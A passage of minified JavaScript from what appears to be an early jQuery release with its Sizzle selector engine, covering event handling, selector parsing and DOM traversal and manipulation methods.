b=a.relatedTarget;while(b&&b!==this){try{b=b.parentNode}catch(e){break}}if(b!==this){a.type=a.data;y.event.handle.apply(this,arguments)}},delegate=function(a){a.type=a.data;y.event.handle.apply(this,arguments)};y.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(b,c){y.event.special[b]={setup:function(a){y.event.add(this,c,a&&a.selector?delegate:D,b)},teardown:function(a){y.event.remove(this,c,a&&a.selector?delegate:D)}}});if(!y.support.submitBubbles){y.event.special.submit={setup:function(b,c,d){if(this.nodeName.toLowerCase()!=="form"){y.event.add(this,"click.specialSubmit."+d.guid,function(e){var a=e.target,type=a.type;if((type==="submit"||type==="image")&&y(a).closest("form").length){return trigger("submit",this,arguments)}});y.event.add(this,"keypress.specialSubmit."+d.guid,function(e){var a=e.target,type=a.type;if((type==="text"||type==="password")&&y(a).closest("form").length&&e.keyCode===13){return trigger("submit",this,arguments)}})}else{return false}},remove:function(a,b){y.event.remove(this,"click.specialSubmit"+(b?"."+b.guid:""));y.event.remove(this,"keypress.specialSubmit"+(b?"."+b.guid:""))}}}if(!y.support.changeBubbles){var E=/textarea|input|select/i;function getVal(b){var c=b.type,val=b.value;if(c==="radio"||c==="checkbox"){val=b.checked}else if(c==="select-multiple"){val=b.selectedIndex>-1?y.map(b.options,function(a){return a.selected}).join("-"):""}else if(b.nodeName.toLowerCase()==="select"){val=b.selectedIndex}return val}function testChange(e){var a=e.target,data,val;if(!E.test(a.nodeName)||a.readOnly){return}data=y.data(a,"_change_data");val=getVal(a);if(e.type!=="focusout"||a.type!=="radio"){y.data(a,"_change_data",val)}if(data===x||val===data){return}if(data!=null||val){e.type="change";return y.event.trigger(e,arguments[1],a)}}y.event.special.change={filters:{focusout:testChange,click:function(e){var a=e.target,type=a.type;if(type==="radio"||type==="checkbox"||a.nodeName.toLowerCase()==="select"){return testChange.call(this,e)}},keydown:function(e){var a=e.target,type=a.type;if((e.keyCode===13&&a.nodeName.toLowerCase()!=="textarea")||(e.keyCode===32&&(type==="checkbox"||type==="radio"))||type==="select-multiple"){return testChange.call(this,e)}},beforeactivate:function(e){var a=e.target;if(a.nodeName.toLowerCase()==="input"&&a.type==="radio"){y.data(a,"_change_data",getVal(a))}}},setup:function(a,b,c){for(var d in F){y.event.add(this,d+".specialChange."+c.guid,F[d])}return E.test(this.nodeName)},remove:function(a,b){for(var c in F){y.event.remove(this,c+".specialChange"+(b?"."+b.guid:""),F[c])}return E.test(this.nodeName)}};var F=y.event.special.change.filters}function trigger(a,b,c){c[0].type=a;return y.event.handle.apply(b,c)}if(document.addEventListener){y.each({focus:"focusin",blur:"focusout"},function(a,b){y.event.special[b]={setup:function(){this.addEventListener(a,handler,true)},teardown:function(){this.removeEventListener(a,handler,true)}};function handler(e){e=y.event.fix(e);e.type=b;return y.event.handle.call(this,e)}})}y.each(["bind","one"],function(i,g){y.fn[g]=function(b,c,d){if(typeof b==="object"){for(var e in b){this[g](e,c,b[e],d)}return this}if(y.isFunction(c)){d=c;c=x}var f=g==="one"?y.proxy(d,function(a){y(this).unbind(a,f);return d.apply(this,arguments)}):d;return b==="unload"&&g!=="one"?this.one(b,c,d):this.each(function(){y.event.add(this,b,f,c)})}});y.fn.extend({unbind:function(a,b){if(typeof a==="object"&&!a.preventDefault){for(var c in a){this.unbind(c,a[c])}return this}return this.each(function(){y.event.remove(this,a,b)})},trigger:function(a,b){return this.each(function(){y.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0]){var c=y.Event(a);c.preventDefault();c.stopPropagation();y.event.trigger(c,b,this[0]);return c.result}},toggle:function(c){var d=arguments,i=1;while(i<d.length){y.proxy(c,d[i++])}return this.click(y.proxy(c,function(a){var b=(y.data(this,"lastToggle"+c.guid)||0)%i;y.data(this,"lastToggle"+c.guid,b+1);a.preventDefault();return d[b].apply(this,arguments)||false}))},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});y.each(["live","die"],function(i,e){y.fn[e]=function(a,b,c){var d,i=0;if(y.isFunction(b)){c=b;b=x}a=(a||"").split(/\s+/);while((d=a[i++])!=null){d=d==="focus"?"focusin":d==="blur"?"focusout":d==="hover"?a.push("mouseleave")&&"mouseenter":d;if(e==="live"){y(this.context).bind(liveConvert(d,this.selector),{data:b,selector:this.selector,live:d},c)}else{y(this.context).unbind(liveConvert(d,this.selector),c?{guid:c.guid+this.selector+d}:null)}}return this}});function liveHandler(a){var b,elems=[],selectors=[],args=arguments,related,match,fn,elem,j,i,l,data,live=y.extend({},y.data(this,"events").live);if(a.button&&a.type==="click"){return}for(j in live){fn=live[j];if(fn.live===a.type||fn.altLive&&y.inArray(a.type,fn.altLive)>-1){data=fn.data;if(!(data.beforeFilter&&data.beforeFilter[a.type]&&!data.beforeFilter[a.type](a))){selectors.push(fn.selector)}}else{delete live[j]}}match=y(a.target).closest(selectors,a.currentTarget);for(i=0,l=match.length;i<l;i++){for(j in live){fn=live[j];elem=match[i].elem;related=null;if(match[i].selector===fn.selector){if(fn.live==="mouseenter"||fn.live==="mouseleave"){related=y(a.relatedTarget).closest(fn.selector)[0]}if(!related||related!==elem){elems.push({elem:elem,fn:fn})}}}}for(i=0,l=elems.length;i<l;i++){match=elems[i];a.currentTarget=match.elem;a.data=match.fn.data;if(match.fn.apply(match.elem,args)===false){b=false;break}}return b}function liveConvert(a,b){return"live."+(a?a+".":"")+b.replace(/\./g,"`").replace(/ /g,"&")}y.each(("blur focus focusin focusout load resize scroll unload click dblclick "+"mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave "+"change select submit keydown keypress keyup error").split(" "),function(i,b){y.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)};if(y.attrFn){y.attrFn[b]=true}});if(w.attachEvent&&!w.addEventListener){w.attachEvent("onunload",function(){for(var a in y.cache){if(y.cache[a].handle){try{y.event.remove(y.cache[a].handle.elem)}catch(e){}}}})}(function(){var j=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^[\]]*\]|['"][^'"]*['"]|[^[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,done=0,toString=Object.prototype.toString,hasDuplicate=false,baseHasDuplicate=true;[0,0].sort(function(){baseHasDuplicate=false;return 0});var k=function(a,b,c,d){c=c||[];var e=b=b||document;if(b.nodeType!==1&&b.nodeType!==9){return[]}if(!a||typeof a!=="string"){return c}var f=[],m,set,checkSet,extra,prune=true,contextXML=t(b),soFar=a;while((j.exec(""),m=j.exec(soFar))!==null){soFar=m[3];f.push(m[1]);if(m[2]){extra=m[3];break}}if(f.length>1&&o.exec(a)){if(f.length===2&&n.relative[f[0]]){set=u(f[0]+f[1],b)}else{set=n.relative[f[0]]?[b]:k(f.shift(),b);while(f.length){a=f.shift();if(n.relative[a]){a+=f.shift()}set=u(a,set)}}}else{if(!d&&f.length>1&&b.nodeType===9&&!contextXML&&n.match.ID.test(f[0])&&!n.match.ID.test(f[f.length-1])){var g=k.find(f.shift(),b,contextXML);b=g.expr?k.filter(g.expr,g.set)[0]:g.set[0]}if(b){var g=d?{expr:f.pop(),set:q(d)}:k.find(f.pop(),f.length===1&&(f[0]==="~"||f[0]==="+")&&b.parentNode?b.parentNode:b,contextXML);set=g.expr?k.filter(g.expr,g.set):g.set;if(f.length>0){checkSet=q(set)}else{prune=false}while(f.length){var h=f.pop(),pop=h;if(!n.relative[h]){h=""}else{pop=f.pop()}if(pop==null){pop=b}n.relative[h](checkSet,pop,contextXML)}}else{checkSet=f=[]}}if(!checkSet){checkSet=set}if(!checkSet){k.error(h||a)}if(toString.call(checkSet)==="[object Array]"){if(!prune){c.push.apply(c,checkSet)}else if(b&&b.nodeType===1){for(var i=0;checkSet[i]!=null;i++){if(checkSet[i]&&(checkSet[i]===true||checkSet[i].nodeType===1&&s(b,checkSet[i]))){c.push(set[i])}}}else{for(var i=0;checkSet[i]!=null;i++){if(checkSet[i]&&checkSet[i].nodeType===1){c.push(set[i])}}}}else{q(checkSet,c)}if(extra){k(extra,e,c,d);k.uniqueSort(c)}return c};k.uniqueSort=function(a){if(r){hasDuplicate=baseHasDuplicate;a.sort(r);if(hasDuplicate){for(var i=1;i<a.length;i++){if(a[i]===a[i-1]){a.splice(i--,1)}}}}return a};k.matches=function(a,b){return k(a,null,null,b)};k.find=function(a,b,c){var d,match;if(!a){return[]}for(var i=0,l=n.order.length;i<l;i++){var e=n.order[i],match;if((match=n.leftMatch[e].exec(a))){var f=match[1];match.splice(1,1);if(f.substr(f.length-1)!=="\\"){match[1]=(match[1]||"").replace(/\\/g,"");d=n.find[e](match,b,c);if(d!=null){a=a.replace(n.match[e],"");break}}}}if(!d){d=b.getElementsByTagName("*")}return{set:d,expr:a}};k.filter=function(a,b,c,d){var e=a,result=[],curLoop=b,match,anyFound,isXMLFilter=b&&b[0]&&t(b[0]);while(a&&b.length){for(var f in n.filter){if((match=n.leftMatch[f].exec(a))!=null&&match[2]){var g=n.filter[f],found,item,left=match[1];anyFound=false;match.splice(1,1);if(left.substr(left.length-1)==="\\"){continue}if(curLoop===result){result=[]}if(n.preFilter[f]){match=n.preFilter[f](match,curLoop,c,result,d,isXMLFilter);if(!match){anyFound=found=true}else if(match===true){continue}}if(match){for(var i=0;(item=curLoop[i])!=null;i++){if(item){found=g(item,match,i,curLoop);var h=d^!!found;if(c&&found!=null){if(h){anyFound=true}else{curLoop[i]=false}}else if(h){result.push(item);anyFound=true}}}}if(found!==x){if(!c){curLoop=result}a=a.replace(n.match[f],"");if(!anyFound){return[]}break}}}if(a===e){if(anyFound==null){k.error(a)}else{break}}e=a}return curLoop};k.error=function(a){throw"Syntax error, unrecognized expression: "+a;};var n=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF-]|\\.)+)\s*(?:(\S?=)\s*(['"]*)(.*?)\3|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\((even|odd|[\dn+-]*)\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")}},relative:{"+":function(a,b){var c=typeof b==="string",isTag=c&&!/\W/.test(b),isPartStrNotTag=c&&!isTag;if(isTag){b=b.toLowerCase()}for(var i=0,l=a.length,elem;i<l;i++){if((elem=a[i])){while((elem=elem.previousSibling)&&elem.nodeType!==1){}a[i]=isPartStrNotTag||elem&&elem.nodeName.toLowerCase()===b?elem||false:elem===b}}if(isPartStrNotTag){k.filter(b,a,true)}},">":function(a,b){var c=typeof b==="string";if(c&&!/\W/.test(b)){b=b.toLowerCase();for(var i=0,l=a.length;i<l;i++){var d=a[i];if(d){var e=d.parentNode;a[i]=e.nodeName.toLowerCase()===b?e:false}}}else{for(var i=0,l=a.length;i<l;i++){var d=a[i];if(d){a[i]=c?d.parentNode:d.parentNode===b}}if(c){k.filter(b,a,true)}}},"":function(a,b,c){var d=done++,checkFn=dirCheck;if(typeof b==="string"&&!/\W/.test(b)){var e=b=b.toLowerCase();checkFn=dirNodeCheck}checkFn("parentNode",b,d,a,e,c)},"~":function(a,b,c){var d=done++,checkFn=dirCheck;if(typeof b==="string"&&!/\W/.test(b)){var e=b=b.toLowerCase();checkFn=dirNodeCheck}checkFn("previousSibling",b,d,a,e,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!=="undefined"&&!c){var m=b.getElementById(a[1]);return m?[m]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!=="undefined"){var c=[],results=b.getElementsByName(a[1]);for(var i=0,l=results.length;i<l;i++){if(results[i].getAttribute("name")===a[1]){c.push(results[i])}}return c.length===0?null:c}},TAG:function(a,b){return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(/\\/g,"")+" ";if(f){return a}for(var i=0,elem;(elem=b[i])!=null;i++){if(elem){if(e^(elem.className&&(" "+elem.className+" ").replace(/[\t\n]/g," ").indexOf(a)>=0)){if(!c){d.push(elem)}}else if(c){b[i]=false}}}return false},ID:function(a){return a[1].replace(/\\/g,"")},TAG:function(a,b){return a[1].toLowerCase()},CHILD:function(a){if(a[1]==="nth"){var b=/(-?)(\d*)n((?:\+|-)?\d*)/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=(b[1]+(b[2]||1))-0;a[3]=b[3]-0}a[0]=done++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1].replace(/\\/g,"");if(!f&&n.attrMap[g]){a[1]=n.attrMap[g]}if(a[2]==="~="){a[4]=" "+a[4]+" "}return a},PSEUDO:function(a,b,c,d,e){if(a[1]==="not"){if((j.exec(a[3])||"").length>1||/^\w/.test(a[3])){a[3]=k(a[3],null,null,b)}else{var f=k.filter(a[3],b,c,true^e);if(!c){d.push.apply(d,f)}return false}}else if(n.match.POS.test(a[0])||n.match.CHILD.test(a[0])){return true}return a},POS:function(a){a.unshift(true);return a}},filters:{enabled:function(a){return a.disabled===false&&a.type!=="hidden"},disabled:function(a){return a.disabled===true},checked:function(a){return a.checked===true},selected:function(a){a.parentNode.selectedIndex;return a.selected===true},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,i,b){return!!k(b[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){return"text"===a.type},radio:function(a){return"radio"===a.type},checkbox:function(a){return"checkbox"===a.type},file:function(a){return"file"===a.type},password:function(a){return"password"===a.type},submit:function(a){return"submit"===a.type},image:function(a){return"image"===a.type},reset:function(a){return"reset"===a.type},button:function(a){return"button"===a.type||a.nodeName.toLowerCase()==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)}},setFilters:{first:function(a,i){return i===0},last:function(a,i,b,c){return i===c.length-1},even:function(a,i){return i%2===0},odd:function(a,i){return i%2===1},lt:function(a,i,b){return i<b[3]-0},gt:function(a,i,b){return i>b[3]-0},nth:function(a,i,b){return b[3]-0===i},eq:function(a,i,b){return b[3]-0===i}},filter:{PSEUDO:function(a,b,i,c){var d=b[1],filter=n.filters[d];if(filter){return filter(a,i,b,c)}else if(d==="contains"){return(a.textContent||a.innerText||getText([a])||"").indexOf(b[3])>=0}else if(d==="not"){var e=b[3];for(var i=0,l=e.length;i<l;i++){if(e[i]===a){return false}}return true}else{k.error("Syntax error, unrecognized expression: "+d)}},CHILD:function(a,b){var c=b[1],node=a;switch(c){case'only':case'first':while((node=node.previousSibling)){if(node.nodeType===1){return false}}if(c==="first"){return true}node=a;case'last':while((node=node.nextSibling)){if(node.nodeType===1){return false}}return true;case'nth':var d=b[2],last=b[3];if(d===1&&last===0){return true}var e=b[0],parent=a.parentNode;if(parent&&(parent.sizcache!==e||!a.nodeIndex)){var f=0;for(node=parent.firstChild;node;node=node.nextSibling){if(node.nodeType===1){node.nodeIndex=++f}}parent.sizcache=e}var g=a.nodeIndex-last;if(d===0){return g===0}else{return(g%d===0&&g/d>=0)}}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return(b==="*"&&a.nodeType===1)||a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],result=n.attrHandle[c]?n.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),value=result+"",p=b[2],check=b[4];return result==null?p==="!=":p==="="?value===check:p==="*="?value.indexOf(check)>=0:p==="~="?(" "+value+" ").indexOf(check)>=0:!check?value&&result!==false:p==="!="?value!==check:p==="^="?value.indexOf(check)===0:p==="$="?value.substr(value.length-check.length)===check:p==="|="?value===check||value.substr(0,check.length+1)===check+"-":false},POS:function(a,b,i,c){var d=b[2],filter=n.setFilters[d];if(filter){return filter(a,i,b,c)}}}};var o=n.match.POS;for(var p in n.match){n.match[p]=new RegExp(n.match[p].source+/(?![^\[]*\])(?![^\(]*\))/.source);n.leftMatch[p]=new RegExp(/(^(?:.|\r|\n)*?)/.source+n.match[p].source.replace(/\\(\d+)/g,function(a,b){return"\\"+(b-0+1)}))}var q=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(document.documentElement.childNodes,0)}catch(e){q=function(a,b){var c=b||[];if(toString.call(a)==="[object Array]"){Array.prototype.push.apply(c,a)}else{if(typeof a.length==="number"){for(var i=0,l=a.length;i<l;i++){c.push(a[i])}}else{for(var i=0;a[i];i++){c.push(a[i])}}}return c}}var r;if(document.documentElement.compareDocumentPosition){r=function(a,b){if(!a.compareDocumentPosition||!b.compareDocumentPosition){if(a==b){hasDuplicate=true}return a.compareDocumentPosition?-1:1}var c=a.compareDocumentPosition(b)&4?-1:a===b?0:1;if(c===0){hasDuplicate=true}return c}}else if("sourceIndex"in document.documentElement){r=function(a,b){if(!a.sourceIndex||!b.sourceIndex){if(a==b){hasDuplicate=true}return a.sourceIndex?-1:1}var c=a.sourceIndex-b.sourceIndex;if(c===0){hasDuplicate=true}return c}}else if(document.createRange){r=function(a,b){if(!a.ownerDocument||!b.ownerDocument){if(a==b){hasDuplicate=true}return a.ownerDocument?-1:1}var c=a.ownerDocument.createRange(),bRange=b.ownerDocument.createRange();c.setStart(a,0);c.setEnd(a,0);bRange.setStart(b,0);bRange.setEnd(b,0);var d=c.compareBoundaryPoints(Range.START_TO_END,bRange);if(d===0){hasDuplicate=true}return d}}function getText(a){var b="",elem;for(var i=0;a[i];i++){elem=a[i];if(elem.nodeType===3||elem.nodeType===4){b+=elem.nodeValue}else if(elem.nodeType!==8){b+=getText(elem.childNodes)}}return b}(function(){var d=document.createElement("div"),id="script"+(new Date).getTime();d.innerHTML="<a name='"+id+"'/>";var e=document.documentElement;e.insertBefore(d,e.firstChild);if(document.getElementById(id)){n.find.ID=function(a,b,c){if(typeof b.getElementById!=="undefined"&&!c){var m=b.getElementById(a[1]);return m?m.id===a[1]||typeof m.getAttributeNode!=="undefined"&&m.getAttributeNode("id").nodeValue===a[1]?[m]:x:[]}};n.filter.ID=function(a,b){var c=typeof a.getAttributeNode!=="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}}e.removeChild(d);e=d=null})();(function(){var e=document.createElement("div");e.appendChild(document.createComment(""));if(e.getElementsByTagName("*").length>0){n.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var i=0;c[i];i++){if(c[i].nodeType===1){d.push(c[i])}}c=d}return c}}e.innerHTML="<a href='#'></a>";if(e.firstChild&&typeof e.firstChild.getAttribute!=="undefined"&&e.firstChild.getAttribute("href")!=="#"){n.attrHandle.href=function(a){return a.getAttribute("href",2)}}e=null})();if(document.querySelectorAll){(function(){var f=k,div=document.createElement("div");div.innerHTML="<p class='TEST'></p>";if(div.querySelectorAll&&div.querySelectorAll(".TEST").length===0){return}k=function(a,b,c,d){b=b||document;if(!d&&b.nodeType===9&&!t(b)){try{return q(b.querySelectorAll(a),c)}catch(e){}}return f(a,b,c,d)};for(var g in f){k[g]=f[g]}div=null})()}(function(){var d=document.createElement("div");d.innerHTML="<div class='test e'></div><div class='test'></div>";if(!d.getElementsByClassName||d.getElementsByClassName("e").length===0){return}d.lastChild.className="e";if(d.getElementsByClassName("e").length===1){return}n.order.splice(1,0,"CLASS");n.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!=="undefined"&&!c){return b.getElementsByClassName(a[1])}};d=null})();function dirNodeCheck(a,b,c,d,e,f){for(var i=0,l=d.length;i<l;i++){var g=d[i];if(g){g=g[a];var h=false;while(g){if(g.sizcache===c){h=d[g.sizset];break}if(g.nodeType===1&&!f){g.sizcache=c;g.sizset=i}if(g.nodeName.toLowerCase()===b){h=g;break}g=g[a]}d[i]=h}}}function dirCheck(a,b,c,d,e,f){for(var i=0,l=d.length;i<l;i++){var g=d[i];if(g){g=g[a];var h=false;while(g){if(g.sizcache===c){h=d[g.sizset];break}if(g.nodeType===1){if(!f){g.sizcache=c;g.sizset=i}if(typeof b!=="string"){if(g===b){h=true;break}}else if(k.filter(b,[g]).length>0){h=g;break}}g=g[a]}d[i]=h}}}var s=document.compareDocumentPosition?function(a,b){return a.compareDocumentPosition(b)&16}:function(a,b){return a!==b&&(a.contains?a.contains(b):true)};var t=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":false};var u=function(a,b){var c=[],later="",match,root=b.nodeType?[b]:b;while((match=n.match.PSEUDO.exec(a))){later+=match[0];a=a.replace(n.match.PSEUDO,"")}a=n.relative[a]?a+"*":a;for(var i=0,l=root.length;i<l;i++){k(a,root[i],c)}return k.filter(later,c)};y.find=k;y.expr=k.selectors;y.expr[":"]=y.expr.filters;y.unique=k.uniqueSort;y.getText=getText;y.isXMLDoc=t;y.contains=s;return;w.Sizzle=k})();var G=/Until$/,rparentsprev=/^(?:parents|prevUntil|prevAll)/,rmultiselector=/,/,slice=Array.prototype.slice;var H=function(b,c,d){if(y.isFunction(c)){return y.grep(b,function(a,i){return!!c.call(a,i,a)===d})}else if(c.nodeType){return y.grep(b,function(a,i){return(a===c)===d})}else if(typeof c==="string"){var e=y.grep(b,function(a){return a.nodeType===1});if(isSimple.test(c)){return y.filter(c,e,!d)}else{c=y.filter(c,e)}}return y.grep(b,function(a,i){return(y.inArray(a,c)>=0)===d})};y.fn.extend({find:function(a){var b=this.pushStack("","find",a),length=0;for(var i=0,l=this.length;i<l;i++){length=b.length;y.find(a,this[i],b);if(i>0){for(var n=length;n<b.length;n++){for(var r=0;r<length;r++){if(b[r]===b[n]){b.splice(n--,1);break}}}}}return b},has:function(a){var b=y(a);return this.filter(function(){for(var i=0,l=b.length;i<l;i++){if(y.contains(this,b[i])){return true}}})},not:function(a){return this.pushStack(H(this,a,false),"not",a)},filter:function(a){return this.pushStack(H(this,a,true),"filter",a)},is:function(a){return!!a&&y.filter(a,this).length>0},closest:function(b,c){if(y.isArray(b)){var d=[],cur=this[0],match,matches={},selector;if(cur&&b.length){for(var i=0,l=b.length;i<l;i++){selector=b[i];if(!matches[selector]){matches[selector]=y.expr.match.POS.test(selector)?y(selector,c||this.context):selector}}while(cur&&cur.ownerDocument&&cur!==c){for(selector in matches){match=matches[selector];if(match.jquery?match.index(cur)>-1:y(cur).is(match)){d.push({selector:selector,elem:cur});delete matches[selector]}}cur=cur.parentNode}}return d}var e=y.expr.match.POS.test(b)?y(b,c||this.context):null;return this.map(function(i,a){while(a&&a.ownerDocument&&a!==c){if(e?e.index(a)>-1:y(a).is(b)){return a}a=a.parentNode}return null})},index:function(a){if(!a||typeof a==="string"){return y.inArray(this[0],a?y(a):this.parent().children())}return y.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a==="string"?y(a,b||this.context):y.makeArray(a),all=y.merge(this.get(),c);return this.pushStack(isDisconnected(c[0])||isDisconnected(all[0])?all:y.unique(all))},andSelf:function(){return this.add(this.prevObject)}});function isDisconnected(a){return!a||!a.parentNode||a.parentNode.nodeType===11}y.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return y.dir(a,"parentNode")},parentsUntil:function(a,i,b){return y.dir(a,"parentNode",b)},next:function(a){return y.nth(a,2,"nextSibling")},prev:function(a){return y.nth(a,2,"previousSibling")},nextAll:function(a){return y.dir(a,"nextSibling")},prevAll:function(a){return y.dir(a,"previousSibling")},nextUntil:function(a,i,b){return y.dir(a,"nextSibling",b)},prevUntil:function(a,i,b){return y.dir(a,"previousSibling",b)},siblings:function(a){return y.sibling(a.parentNode.firstChild,a)},children:function(a){return y.sibling(a.firstChild)},contents:function(a){return y.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:y.makeArray(a.childNodes)}},function(d,e){y.fn[d]=function(a,b){var c=y.map(this,e,a);if(!G.test(d)){b=a}if(b&&typeof b==="string"){c=y.filter(b,c)}c=this.length>1?y.unique(c):c;if((this.length>1||rmultiselector.test(b))&&rparentsprev.test(d)){c=c.reverse()}return this.pushStack(c,d,slice.call(arguments).join(","))}});y.extend({filter:function(a,b,c){if(c){a=":not("+a+")"}return y.find.matches(a,b)},dir:function(a,b,c){var d=[],cur=a[b];while(cur&&cur.nodeType!==9&&(c===x||cur.nodeType!==1||!y(cur).is(c))){if(cur.nodeType===1){d.push(cur)}cur=cur[b]}return d},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c]){if(a.nodeType===1&&++e===b){break}}return a},sibling:function(n,a){var r=[];for(;n;n=n.nextSibling){if(n.nodeType===1&&n!==a){r.push(n)}}return r}});var I=/ jQuery\d+="(?:\d+|null)"/g,rleadingWhitespace=/^\s+/,rxhtmlTag=/(<([\w:]+)[^>]*?)\/>/g,rselfClosing=/^(?:area|br|col|embed|hr|img|input|link|meta|param)$/i,rtagName=/<([\w:]+)/,rtbody=/<tbody/i,rhtml=/<|&\w+;/,rchecked=/checked\s*(?:[^=]|=\s*.checked.)/i,fcloseTag=function(a,b,c){return rselfClosing.test(c)?a:b+"></"+c+">"},wrapMap={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};wrapMap.optgroup=wrapMap.option;wrapMap.tbody=wrapMap.tfoot=wrapMap.colgroup=wrapMap.caption=wrapMap.thead;wrapMap.th=wrapMap.td;if(!y.support.htmlSerialize){wrapMap._default=[1,"div<div>","</div>"]}y.fn.extend({text:function(b){if(y.isFunction(b)){return this.each(function(i){var a=y(this);a.text(b.call(this,i,a.text()))})}if(typeof b!=="object"&&b!==x){return this.empty().append((this[0]&&this[0].ownerDocument||document).createTextNode(b))}return y.getText(this)},wrapAll:function(b){if(y.isFunction(b)){return this.each(function(i){y(this).wrapAll(b.call(this,i))})}if(this[0]){var c=y(b,this[0].ownerDocument).eq(0).clone(true);if(this[0].parentNode){c.insertBefore(this[0])}c.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1){a=a.firstChild}return a}).append(this)}return this},wrapInner:function(b){if(y.isFunction(b)){return this.each(function(i){y(this).wrapInner(b.call(this,i))})}return this.each(function(){var a=y(this),contents=a.contents();if(contents.length){contents.wrapAll(b)}else{a.append(b)}})},wrap:function(a){return this.each(function(){y(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){if(!y.nodeName(this,"body")){y(this).replaceWith(this.childNodes)}}).end()},append:function(){return this.domManip(arguments,true,function(a){if(this.nodeType===1){this.appendChild(a)}})},prepend:function(){return this.domManip(arguments,true,function(a){if(this.nodeType===1){this.insertBefore(a,this.firstChild)}})},before:function(){if(this[0]&&this[0].parentNode){return this.domManip(arguments,false,function(a){this.parentNode.insertBefore(a,this)})}else if(arguments.length){var b=y(arguments[0]);b.push.apply(b,this.toArray());return this.pushStack(b,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode){return this.domManip(arguments,false,function(a){this.parentNode.insertBefore(a,this.nextSibling)})}else if(arguments.length){var b=this.pushStack(this,"after",arguments);b.push.apply(b,y(arguments[0]).toArray());return b}},clone:function(c){var d=this.map(function(){if(!y.support.noCloneEvent&&!y.isXMLDoc(this)){var a=this.outerHTML,ownerDocument=this.ownerDocument;if(!a){var b=ownerDocument.createElement("div");b.appendChild(this.cloneNode(true));a=b.innerHTML}return y.clean([a.replace(I,"").replace(rleadingWhitespace,"")],ownerDocument)[0]}else{return this.cloneNode(true)}});if(c===true){cloneCopyEvent(this,d);cloneCopyEvent(this.find("*"),d.find("*"))}return d},html:function(b){if(b===x){return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(I,""):null}else if(typeof b==="string"&&!/<script/i.test(b)&&(y.support.leadingWhitespace||!rleadingWhitespace.test(b))&&!wrapMap[(rtagName.exec(b)||["",""])[1].toLowerCase()]){b=b.replace(rxhtmlTag,fcloseTag);try{for(var i=0,l=this.length;i<l;i++){if(this[i].nodeType===1){y.cleanData(this[i].getElementsByTagName("*"));this[i].innerHTML=b}}}catch(e){this.empty().append(b)}}else if(y.isFunction(b)){this.each(function(i){var a=y(this),old=a.html();a.empty().append(function(){return b.call(this,i,old)})})}else{this.empty().append(b)}return this},replaceWith:function(b){if(this[0]&&this[0].parentNode){if(!y.isFunction(b)){b=y(b).detach()}else{return this.each(function(i){var a=y(this),old=a.html();a.replaceWith(b.call(this,i,old))})}return this.each(function(){var a=this.nextSibling,parent=this.parentNode;y(this).remove();if(a){y(a).before(b)}else{y(parent).append(b)}})}else{return this.pushStack(y(y.isFunction(b)?b():b),"replaceWith",b)}},detach:function(a){return this.remove(a,true)},domManip:function(c,d,e){var f,first,value=c[0],scripts=[];if(!y.support.checkClone&&arguments.length===3&&typeof value==="string"&&rchecked.test(value)){return this.each(function(){y(this).domManip(c,d,e,true)})}if(y.isFunction(value)){return this.each(function(i){var 